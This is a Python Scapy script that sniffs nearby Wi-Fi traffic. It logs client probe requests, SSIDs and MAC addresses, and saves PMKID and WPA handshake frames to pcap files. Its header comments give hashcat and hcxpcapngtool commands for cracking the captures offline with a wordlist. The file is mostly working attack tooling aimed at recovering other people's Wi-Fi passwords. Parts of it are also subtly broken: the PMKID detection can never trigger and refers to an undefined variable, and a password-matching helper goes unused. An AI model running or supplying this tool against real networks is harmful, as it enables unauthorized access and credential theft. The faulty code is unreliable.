# Wi-Fi traffic playground for sniffing and logging wireless probe, PMKID,
# and WPA handshake activity on the configured interface.
# Intended for packet capture experiments and offline cracking workflows.

from scapy.all import *
import re
import datetime
import os
import platform

conf.use_pcap = True
# PMKID
# hcxpcapngtool -o pmkid.16800 wpa_handshakes.pcap
# hashcat -m 16800 pmkid.16800 rockyou.txt --force

# WPA Handshake
# hcxpcapngtool -o handshake.22000 wpa_handshakes.pcap
# hashcat -m 22000 handshake.22000 rockyou.txt --force

INTERFACE = "wlan0"

# Log files
LOG_FILE = "password_leaks.log"
PCAP_FILE_PROBES = "leaked_probes.pcap"
PCAP_FILE_HANDSHAKES = "wpa_handshakes.pcap"

probe_count = 0
pmkid_count = 0
wpa_handshake_count = 0

# PCAP Writers
pcap_probes = PcapWriter(PCAP_FILE_PROBES, append=True, sync=True)
pcap_handshakes = PcapWriter(PCAP_FILE_HANDSHAKES, append=True, sync=True)

EXCLUDED_SSIDS = ["PublicWiFi", "TestSSID"]
PASSWORD_PATTERNS = [
    r"(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}",  # Alphanumeric, at least 8 chars
    r"(?=.*[A-Za-z])(?=.*[!@#$%^&*])[A-Za-z\d!@#$%^&*]{6,}",  # Includes special chars
    r".{8,}",  # Any long string (fallback)
]

def get_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def print_overall_count():
    global probe_count, pmkid_count, wpa_handshake_count
    print(f"[i] Probes captured: {probe_count}")
    print(f"[i] PMKIDs ready to crack: {pmkid_count}")
    print(f"[i] WPA handshakes sniffed: {wpa_handshake_count}")

def print_pmkid(essid, bssid):
    print(f"\n[{get_timestamp()}] [*] PMKID Captured!")
    print(f"[i] SSID: {essid} | BSSID: {bssid}")
    print(f"[+] Saving to {PCAP_FILE_HANDSHAKES}\n")

def print_wpa_handshake(bssid, client_mac):
    print(f"\n[{get_timestamp()}] [*] WPA Handshake Captured!")
    print(f"[i] BSSID: {bssid} | Client MAC: {client_mac}")
    print(f"[+] Saving to {PCAP_FILE_HANDSHAKES}\n")

def is_potential_password(ssid):
    """Check if the SSID resembles a password."""
    for pattern in PASSWORD_PATTERNS:
        if re.fullmatch(pattern, ssid):
            return True
    return False

def log_probe_request(ssid, mac, packet):
    global probe_count, pmkid_count, wpa_handshake_count
    """Log probe request SSID & packet data."""
    log_entry = (
        f"\n[{get_timestamp()}] [*] Probe Request Detected\n"
        f"[i] SSID: {ssid}\n"
        f"[i] MAC Address: {mac}\n"
        f"[i] Raw Packet Data:\n{packet.summary()}\n"
        f"[i] Hex Dump:\n{hexdump(packet, dump=True)}\n"
        f"{'-'*60}\n"
    )

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    pcap_probes.write(packet)
    probe_count = probe_count + 1
    print(log_entry.strip())
    print_overall_count()

def detect_probe_requests(pkt):
    """Detect and log probe requests, ensuring Dot11Elt exists."""
    isProbeRequest = pkt.haslayer(Dot11ProbeReq)
    if not isProbeRequest:
        return
       
    # Check if Dot11Elt (SSID element) exists
    ssid_elem = pkt.getlayer(Dot11Elt)

    if not ssid_elem or not ssid_elem.info:
        return
        
    ssid = ssid_elem.info.decode(errors="ignore").strip()
    mac = pkt[Dot11].addr2  # Client MAC

    if ssid in EXCLUDED_SSIDS:
        return
        
    log_probe_request(ssid, mac, pkt)

def is_valid_pmkid(rsn_info):
    """Check if RSN IE contains a valid PMKID"""
    if len(rsn_info) < 20:
        return False  # RSN IE must be at least 20 bytes for a valid PMKID

    pmkid_count_field = int.from_bytes(rsn_info[-18:-16], "big")  # PMKID Count field
    if pmkid_count_field == 1:
        return True  # A valid PMKID is included

    return False

def detect_pmkid(pkt):
    global probe_count, pmkid_count, wpa_handshake_count
    hasBeacon = pkt.haslayer(Dot11Beacon)
    hasAssociationResponse = pkt.haslayer(Dot11AssoResp)
    """Detect and log PMKID from WPA2/WPA3 Beacon or Association Response frames."""

    if not hasBeacon or not hasAssociationResponse:  # Ignore probe requests
        return
    
    bssid = pkt[Dot11].addr2
    ssid_element = pkt.getlayer(Dot11Elt)

    if not ssid_element or not ssid_element.info:
        return

    essid = ssid_element.info.decode(errors="ignore").strip()

    if essid in EXCLUDED_SSIDS:
        return

    rsn_element = pkt.getlayer(Dot11Elt, ID=48)  # RSN is Element ID 48 in Wi-Fi frames
                
    if rsn_element and is_valid_pmkid(rsn_elem.info):
        pmkid = rsn_element.info[-16:].hex()  # Extract PMKID
        print_pmkid(essid, bssid)
        pcap_handshakes.write(pkt)
        pmkid_count = pmkid_count + 1
        print_overall_count()

def detect_wpa_handshake(pkt):
    global probe_count, pmkid_count, wpa_handshake_count
    """Detect WPA 4-way handshake packets (EAPOL)"""
    hasEAPOL = pkt.haslayer(EAPOL)

    if not hasEAPOL:
        return
    
    bssid = pkt[Dot11].addr1  # AP MAC
    client_mac = pkt[Dot11].addr2  # Client MAC


    # Determine EAPOL message type (Handshake Key exchange)
    #key_info = pkt[EAPOL].load[1:3] if pkt[EAPOL].load else b"\x00\x00"
    #key_info_int = int.from_bytes(key_info, "big")

    #isHandshakeMessage = key_info_int & 0x0080

    #if isHandshakeMessage: 
    print_wpa_handshake(bssid, client_mac)
    pcap_handshakes.write(pkt)
    wpa_handshake_count = wpa_handshake_count + 1
    print_overall_count()

def packet_handler(pkt):
    """Analyze packets for probe requests, PMKID, and WPA handshakes."""
    try:
        detect_probe_requests(pkt)
        detect_pmkid(pkt)
        detect_wpa_handshake(pkt)
    except Exception as e:
        print(f"[!] Error processing packet: {e}")

def main():
    # Start sniffing probe requests
    print(f"[i] Listening for probe requests on {INTERFACE}...")
    print(f"[i] Probes will be logged to '{LOG_FILE}' and '{PCAP_FILE_PROBES}'\n")
    print(f"[i] WPA handshakes will be saved to '{PCAP_FILE_HANDSHAKES}'\n")

    sniff(iface=INTERFACE, prn=packet_handler, store=False)


if __name__ in '__main__':
    main()